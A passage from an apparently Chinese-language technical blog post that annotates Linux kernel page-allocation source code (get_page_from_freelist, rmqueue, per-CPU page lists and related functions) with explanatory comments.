get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配成功则跳出，否则调用下面的慢速路径分配继续处理</span></span><br><span class="line">    <span class="keyword">if</span> (likely(page))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">    </span><br><span class="line">alloc_mask = current_gfp_context(gfp_mask);</span><br><span class="line">ac.spread_dirty_pages = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ac.nodemask != nodemask))</span><br><span class="line">ac.nodemask = nodemask;</span><br><span class="line"></span><br><span class="line">    ac.nodemask = nodemask;</span><br><span class="line"><span class="comment">// 从全局内存池中分配页面，其中的工作包括回收物理内存页面</span></span><br><span class="line">    <span class="comment">// 是内存分配的慢速路径</span></span><br><span class="line">page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;</span><br><span class="line">    unlikely(__memcg_kmem_charge(page, gfp_mask, order) != <span class="number">0</span>)) &#123;</span><br><span class="line">__free_pages(page, order);</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数主要是执行以下步骤：</p><ul><li>prepare_alloc_pages()</li><li>alloc_flags_nofragment()</li><li>get_page-from_freelist()</li><li>__alloc_pages_slowpath()</li></ul><p>这些函数在接下来都会介绍</p><h5 id="prepare-alloc-pages"><a href="#prepare-alloc-pages" class="headerlink" title="prepare_alloc_pages"></a>prepare_alloc_pages</h5><p><strong>原型：static inline bool prepare_alloc_pages(gfp_t gfp_mask, unsigned int order,</strong></p><p>​    <strong>int preferred_nid, nodemask_t* nodemask,</strong></p><p>​    <strong>struct alloc_context *ac, gfp_t *alloc_mask,</strong></p><p>​    <strong>unsigned int *alloc_flags)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">prepare_alloc_pages</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> preferred_nid, <span class="keyword">nodemask_t</span> *nodemask,</span></span></span><br><span class="line"><span class="function"><span class="params">struct alloc_context *ac, <span class="keyword">gfp_t</span> *alloc_mask,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">unsigned</span> <span class="keyword">int</span> *alloc_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ac填充从gfp_mask获取的内存分配参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得指定的zone，表示可供分配的那些zone中最高的那个zone的idx</span></span><br><span class="line">ac-&gt;high_zoneidx = gfp_zone(gfp_mask);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 获得node对应的zone_list</span></span><br><span class="line">ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask);</span><br><span class="line">ac-&gt;nodemask = nodemask;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 选择迁移类型</span></span><br><span class="line">ac-&gt;migratetype = gfpflags_to_migratetype(gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否存在cpuset机制</span></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled()) &#123;</span><br><span class="line">*alloc_mask |= __GFP_HARDWALL;</span><br><span class="line"><span class="keyword">if</span> (!ac-&gt;nodemask)</span><br><span class="line">ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*alloc_flags |= ALLOC_CPUSET;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数未实现</span></span><br><span class="line">fs_reclaim_acquire(gfp_mask);</span><br><span class="line">fs_reclaim_release(gfp_mask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果内存紧张可能会休眠</span></span><br><span class="line">might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对gfp_mask, ord做检查(默认没有开启CONFIG_FAIL_PAGE_ALLOC的情况下, 直接return false)</span></span><br><span class="line"><span class="keyword">if</span> (should_fail_alloc_page(gfp_mask, order))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">*alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//指定是否进行脏页的传播</span></span><br><span class="line">ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//指定要在快速路径中首先分配的区域，在慢路径中指定了zonelist中的第一个可用区域</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化页面分配器中会用到的参数，这些参数会临时存放在alloc_context数据结构中，也就是ac中，关于alloc_context数据结构可以看下图：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13441677614/0" alt="image-20210422145831111"></p><ul><li>zonelist：指向用于分配页面的区域列表</li><li>nodemask：指定内存分配的Node，如果没有指定，则在所有节点中进行分配</li><li>preferred_zoneref：指定要在快速路径中首先分配的区域，在慢路径中指定了一个zonelist中的第一个可用区域</li><li>migratetype：页面迁移类型</li><li>highest_zoneidx：允许内存分配的最高zone</li><li>spread_dirty_pages：指定是否进行脏页的传播</li></ul><h5 id="alloc-flags-nofragment"><a href="#alloc-flags-nofragment" class="headerlink" title="alloc_flags_nofragment"></a>alloc_flags_nofragment</h5><p><strong>原型：static inline unsigned int alloc_flags_nofragment(struct zone <em>*zone</em>, gfp_t gfp_mask)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line">alloc_flags_nofragment(struct zone *zone, <span class="keyword">gfp_t</span> gfp_mask)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * __GFP_KSWAPD_RECLAIM is assumed to be the same as ALLOC_KSWAPD</span></span><br><span class="line"><span class="comment"> * to save a branch.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">// 如果gfp_mask限定了使用__GFP_KSWAPD_RECLAIM， 则在alloc标志中添加ALLOC_KSWAPD， 在内存不足时以唤醒kswapd</span></span><br><span class="line">alloc_flags = (__force <span class="keyword">int</span>) (gfp_mask &amp; __GFP_KSWAPD_RECLAIM);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line"><span class="keyword">if</span> (!zone)</span><br><span class="line"><span class="keyword">return</span> alloc_flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zone_idx(zone) != ZONE_NORMAL)</span><br><span class="line"><span class="keyword">return</span> alloc_flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If ZONE_DMA32 exists, assume it is the one after ZONE_NORMAL and</span></span><br><span class="line"><span class="comment"> * the pointer is within zone-&gt;zone_pgdat-&gt;node_zones[]. Also assume</span></span><br><span class="line"><span class="comment"> * on UMA that if Normal is populated then so is DMA32.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">BUILD_BUG_ON(ZONE_NORMAL - ZONE_DMA32 != <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (nr_online_nodes &gt; <span class="number">1</span> &amp;&amp; !populated_zone(--zone))</span><br><span class="line"><span class="keyword">return</span> alloc_flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该标志表示需要避免碎片化</span></span><br><span class="line">alloc_flags |= ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_ZONE_DMA32 */</span></span></span><br><span class="line"><span class="keyword">return</span> alloc_flags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数主要根据区域和gfp掩码请求添加分配标志，<code>alloc_flags</code>主要是函数内部使用。</p><h5 id="get-page-from-freelist"><a href="#get-page-from-freelist" class="headerlink" title="get_page_from_freelist"></a>get_page_from_freelist</h5><p><strong>原型：static struct page * get_page_from_freelist(gfp_t gfp_mask, unsigned int order, int alloc_flags,const struct alloc_context *ac)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class"><span class="title">get_page_from_freelist</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">alloc_flags</span>,</span></span><br><span class="line"><span class="class"><span class="title">const</span> <span class="keyword">struct</span> <span class="title">alloc_context</span> *<span class="title">ac</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">z</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">last_pgdat_dirty_limit</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> no_fallback;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Scan zonelist, looking for a zone with enough free.</span></span><br><span class="line"><span class="comment"> * See also __cpuset_node_allowed() comment in kernel/cpuset.c.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT;</span><br><span class="line">z = ac-&gt;preferred_zoneref;</span><br><span class="line">    <span class="comment">// 遍历zonelist，从ac-&gt;preferred_zoneref这个zone开始，</span></span><br><span class="line">    <span class="comment">// 结束判断条件是小于等于ac-&gt;high_zoneidx</span></span><br><span class="line">    <span class="comment">// 例：high_zoneidx=1，就是类似NORMAL(idx=1)-&gt;DMA(idx=0)这种顺利遍历zone,而其它zone不满足因其index不小于等于high_zoneidx</span></span><br><span class="line">for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,</span><br><span class="line">ac-&gt;nodemask) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mark;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断cpuset是否开启且当前cpu是否允许在内存域zone所在节点中分配内存</span></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled() &amp;&amp;</span><br><span class="line">(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;</span><br><span class="line">!__cpuset_zone_allowed(zone, gfp_mask))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// ac-&gt;spread_dirty_pages不为0表示gfp_mask存在__GFP_WRITE标志位，又可能增加脏页</span></span><br><span class="line"><span class="keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;</span><br><span class="line"><span class="keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">   <span class="comment">// 如果zone对应的node脏页超标则使用last_pgdat_dirty_limit标识, 并跳过该zone</span></span><br><span class="line"><span class="keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;</span><br><span class="line">last_pgdat_dirty_limit = zone-&gt;zone_pgdat;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果设置no_fallback且当前zone并非preferred_zone, 则索引zone-&gt;node, 如果该node并非preferred_zone-&gt;node, 则取消ALLOC_NOFRAGMENT标志位即设置fallback(因为相比于内存碎片, 内存局部性更重要)</span></span><br><span class="line"><span class="keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;</span><br><span class="line"><span class="keyword">int</span> local_nid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If moving to a remote node, retry but allow</span></span><br><span class="line"><span class="comment"> * fragmenting fallbacks. Locality is more important</span></span><br><span class="line"><span class="comment"> * than fragmentation avoidance.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);</span><br><span class="line"><span class="keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//mark保存当前的zone的水位值(如之前分配标志是ALLOC_WMARK_LOW，则这里是WMARK_LOW)</span></span><br><span class="line">mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);</span><br><span class="line">        <span class="comment">//判断此zone的free_pages是否大于mark+lowmem_reserve(最低预留)，如果大于表示满足返回ture</span></span><br><span class="line"><span class="keyword">if</span> (!zone_watermark_fast(zone, order, mark,</span><br><span class="line">       ac-&gt;highest_zoneidx, alloc_flags,</span><br><span class="line">       gfp_mask)) &#123;</span><br><span class="line">        <span class="comment">//显然走到这行说明返回了false，因此空闲page不够需要先对内存进行回收</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Watermark failed for this zone, but see if we can</span></span><br><span class="line"><span class="comment"> * grow this zone if it contains deferred pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Checked here to keep the fast path fast */</span></span><br><span class="line">BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node_reclaim_mode == <span class="number">0</span> ||</span><br><span class="line">    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">// 内存回收</span></span><br><span class="line">ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_NOSCAN:</span><br><span class="line"><span class="comment">/* did not scan */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_FULL:</span><br><span class="line"><span class="comment">/* scanned but unreclaimable */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">/* did we reclaim enough */</span></span><br><span class="line"><span class="keyword">if</span> (zone_watermark_ok(zone, order, mark,</span><br><span class="line">ac-&gt;highest_zoneidx, alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_this_zone:</span><br><span class="line">        <span class="comment">// 伙伴算法开始分配页内存</span></span><br><span class="line">page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,</span><br><span class="line">gfp_mask, alloc_flags, ac-&gt;migratetype);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">prep_new_page(page, order, gfp_mask, alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If this is a high-order atomic allocation then check</span></span><br><span class="line"><span class="comment"> * if the pageblock should be reserved for the future</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))</span><br><span class="line">reserve_highatomic_pageblock(page, zone, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/* Try again if zone has deferred pages */</span></span><br><span class="line"><span class="keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (no_fallback) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从preferred zone开始遍历zonelist，这里使用<code>for_next_zone_zonelist_nodemask</code>宏来遍历。需要注意的是扫描zone的方向是从高端zone到低端zone。然后判断zone是否满足分配需求，如果zone空间不足，则进行node_reclaim()，尝试页面回收。如果回收后的空间满足要求，则调用<code>rmqueue()</code>从伙伴系统中进行内存分配。分配成功则返回<code>page</code></p><h6 id="rmqueue"><a href="#rmqueue" class="headerlink" title="rmqueue"></a>rmqueue</h6><p><strong>原型：static inline struct page* rmqueue(struct zone *preferred_zone,struct zone *zone, unsigned int order,gfp_t *gfp_flags, unsigned int alloc_flags,int migratetype)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="function">struct page *<span class="title">rmqueue</span><span class="params">(struct zone *preferred_zone,</span></span></span><br><span class="line"><span class="function"><span class="params">struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">gfp_t</span> gfp_flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> migratetype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(order == <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_MOVABLE pcplist could have the pages on CMA area and</span></span><br><span class="line"><span class="comment"> * we need to skip it when CMA area isn&#x27;t allowed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||</span><br><span class="line">migratetype != MIGRATE_MOVABLE) &#123;</span><br><span class="line">page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,</span><br><span class="line">migratetype, alloc_flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能使用__GFP_NOFAIL, 分配order&gt;1的页</span></span><br><span class="line">WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="number">1</span>));</span><br><span class="line">    <span class="comment">// 使用自旋锁加锁zone资源</span></span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * order-0 request can reach here when the pcplist is skipped</span></span><br><span class="line"><span class="comment"> * due to non-CMA allocation context. HIGHATOMIC area is</span></span><br><span class="line"><span class="comment"> * reserved for high-order atomic allocation, so order-0</span></span><br><span class="line"><span class="comment"> * request should skip it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (order &gt; <span class="number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;</span><br><span class="line">page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line">trace_mm_page_alloc_zone_locked(page, order, migratetype);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line">page = __rmqueue(zone, order, migratetype, alloc_flags);</span><br><span class="line">&#125; <span class="keyword">while</span> (page &amp;&amp; check_new_pages(page, order));</span><br><span class="line">spin_unlock(&amp;zone-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">goto</span> failed;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">  get_pcppage_migratetype(page));</span><br><span class="line"></span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">zone_statistics(preferred_zone, zone);</span><br><span class="line">local_irq_restore(flags);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">/* Separate test+clear to avoid unnecessary atomics */</span></span><br><span class="line"><span class="keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;</span><br><span class="line">clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);</span><br><span class="line">wakeup_kswapd(zone, <span class="number">0</span>, <span class="number">0</span>, zone_idx(zone));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line"></span><br><span class="line">failed:</span><br><span class="line">local_irq_restore(flags);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rmqueue</code>会根据order=0和order&gt;0两种情况走不同的分配流程。</p><p>在针对order=0的分配中，即从cpu高速缓存中分配，因单个(1个page)cpu访问非常频繁，这种涉及缓解了多cpu访问zone时的锁竞争提高了性能。注意这个不是送伙伴系统中申请，但当<code>pcp</code>中为空，则会从伙伴系统中申请<code>batch</code>数量的<code>page</code>来初始化<code>pcp</code>。下面简要看下流程。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Lock and remove page from the per-cpu list */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">rmqueue_pcplist</span><span class="params">(struct zone *preferred_zone,</span></span></span><br><span class="line"><span class="function"><span class="params">struct zone *zone, <span class="keyword">gfp_t</span> gfp_flags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> migratetype, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁用全部中断，并将当前中断状态保存至flags</span></span><br><span class="line">local_irq_save(flags);</span><br><span class="line">    <span class="comment">// 获取当前cpu中对应zone的pcp对象(热页)</span></span><br><span class="line">pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;</span><br><span class="line">    <span class="comment">// 通过pcp获取对应迁移类型的链表</span></span><br><span class="line"><span class="built_in">list</span> = &amp;pcp-&gt;lists[migratetype];</span><br><span class="line">    <span class="comment">// 从pcplist链表上获取对应的page，如果list为空，则会调用rmqueue_bulk从伙伴系统申请batch数量的page来初始化list。</span></span><br><span class="line">page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span>);</span><br><span class="line">zone_statistics(preferred_zone, zone);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 恢复中断状态并开中断</span></span><br><span class="line">local_irq_restore(flags);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对order&gt;0即非单页，则从伙伴系统中对应的迁移类型列表中申请page</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">rmqueue</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Balance movable allocations between regular and CMA areas by</span></span><br><span class="line"><span class="comment"> * allocating from CMA when over half of the zone&#x27;s free memory</span></span><br><span class="line"><span class="comment"> * is in the CMA area.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;</span><br><span class="line">    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;</span><br><span class="line">    zone_page_state(zone, NR_FREE_PAGES) / <span class="number">2</span>) &#123;</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">    <span class="comment">// 使用__rmqueue_smallest获得page</span></span><br><span class="line">page = __rmqueue_smallest(zone, order, migratetype);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">        <span class="comment">// 如果分配失败，则加上ALLOC_CMA标志后再次尝试</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA)</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// page分配再次失败后使用判断是否可以使用备用迁移类型(如果可以则修改order, migratetype)然后跳转进入retry</span></span><br><span class="line"><span class="keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,</span><br><span class="line">alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line">trace_mm_page_alloc_zone_locked(page, order, migratetype);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="alloc-pages-slowpath"><a href="#alloc-pages-slowpath" class="headerlink" title="__alloc_pages_slowpath"></a>__alloc_pages_slowpath</h5><p>原型：static inline struct page* __alloc_pages_slowpath(gfp_t gfp_mask, unsigned int order,struct alloc_context *ac)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span 